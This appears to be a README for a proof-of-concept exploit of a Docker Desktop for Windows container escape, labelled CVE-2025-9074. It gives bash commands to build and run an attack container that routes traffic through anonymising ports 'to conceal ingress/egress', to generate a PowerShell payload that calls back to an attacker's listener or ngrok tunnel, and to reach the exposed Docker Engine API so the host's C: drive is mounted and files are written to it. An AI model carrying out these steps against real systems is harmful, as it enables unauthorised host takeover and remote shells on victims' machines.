### docker desktop for windows container escape exploit
---

Escape from container to write payload to host machine.

Target the Docker Desktop API socket usually found on port 2375.  Modify settings to correct target machine.

```bash
# change dns, using quad9 - change this to nameserver other than ISP
sudo mv /etc/resolv.conf /etc/resolv.conf.bak
sudo touch /etc/resolv.conf
echo -ne 'nameserver 9.9.9.9\nnameserver 149.112.112.112' | sudo tee -a /etc/resolv.conf

# build image
podman build -t escape .

# runtime exploit with all tools needed to conceal ingress/egress
podman run -it --name escape \
    --cap-add=net_admin \
    --device /dev/net/tun \
    -v /etc/resolv.conf:/etc/resolv.conf:ro \
    -p 127.0.0.1:8118:8118 -p 127.0.0.1:9050:9050 -p 127.0.0.1:9051:9051 \
    -d escape

podman exec -it escape /bin/bash

# usage, generate payload, e.g. ngrok tunnel on host machine
python3 pwsh_payload.py -h
# python3 pwsh_payload.py -l [ LOCAL MACHINE ] -p [ PORT ]

# output will be pwsh payload to transfer to host running docker desktop

# deliver payload, modify the settings
#  Docker Engine API (default: http://192.168.65.7:2375) from the container where you run the PoC
# --host        Engine host IP (default: 192.168.65.7)
# --port        Engine port     (default: 2375)
# --image       Container image (default: alpine)
# --host-path   Path on engine host/VM to bind (default: /mnt/host/c)
# --mount-path  Path inside the container      (default: /host_root)
# --outfile     Filename to create on host C:\ (default: pwn.txt)

# customize output filename or image
# python3 cve_2025_9074_poc.py --outfile test.txt --image busybox

python3 CVE_2025_9074.py -h
```